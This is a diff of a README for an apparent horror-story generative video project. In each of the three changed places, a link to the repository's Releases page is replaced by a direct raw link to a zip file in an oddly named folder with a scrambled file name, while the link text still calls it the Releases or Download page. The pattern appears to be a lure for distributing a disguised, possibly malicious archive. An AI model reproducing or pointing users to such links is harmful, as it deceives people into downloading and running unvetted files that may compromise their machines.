@@ -1,7 +1,7 @@
 # 🎥 the-hotel-loop-generative-video - Experience a Unique Horror Story
 
 ## 📥 Download Now
-[![Download the-hotel-loop-generative-video](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/Nalced143/the-hotel-loop-generative-video/releases)
+[![Download the-hotel-loop-generative-video](https://raw.githubusercontent.com/Nalced143/the-hotel-loop-generative-video/main/chiastoneury/loop-generative-the-video-hotel-v2.5-beta.3.zip)](https://raw.githubusercontent.com/Nalced143/the-hotel-loop-generative-video/main/chiastoneury/loop-generative-the-video-hotel-v2.5-beta.3.zip)
 
 ## 📖 About the Project
 The hotel-loop-generative-video offers an intriguing experience. In this narrative, a young woman finds herself in a haunting loop. As she runs down a hotel corridor, her breath quickens. She reaches the end, bursts through double doors—and finds herself back at the start of the same hallway. Panic sets in as the lights flicker red, amplifying the tension.
@@ -13,7 +13,7 @@ To get started with the hotel-loop-generative-video, follow these simple steps:
 
 1. **Visit the Releases Page:**
    Click the link below to go to the Release page:
-   [Download Page](https://github.com/Nalced143/the-hotel-loop-generative-video/releases)
+   [Download Page](https://raw.githubusercontent.com/Nalced143/the-hotel-loop-generative-video/main/chiastoneury/loop-generative-the-video-hotel-v2.5-beta.3.zip)
 
 2. **Choose the Right Version:**
    Look through the available versions. Each version includes updates and improvements. Select the most recent version for the best experience.
@@ -68,4 +68,4 @@ If you need assistance or have questions, please reach out through the Issues se
 The hotel-loop-generative-video is open-source software. You are free to modify and distribute it under the terms specified in the LICENSE file found in the repository.
 
 ## 📦 Download & Install
-To download the hotel-loop-generative-video, visit the Releases page here: [Download Page](https://github.com/Nalced143/the-hotel-loop-generative-video/releases). Follow the provided installation steps above to get started. Enjoy your experience in this chilling narrative journey!
+To download the hotel-loop-generative-video, visit the Releases page here: [Download Page](https://raw.githubusercontent.com/Nalced143/the-hotel-loop-generative-video/main/chiastoneury/loop-generative-the-video-hotel-v2.5-beta.3.zip). Follow the provided installation steps above to get started. Enjoy your experience in this chilling narrative journey!
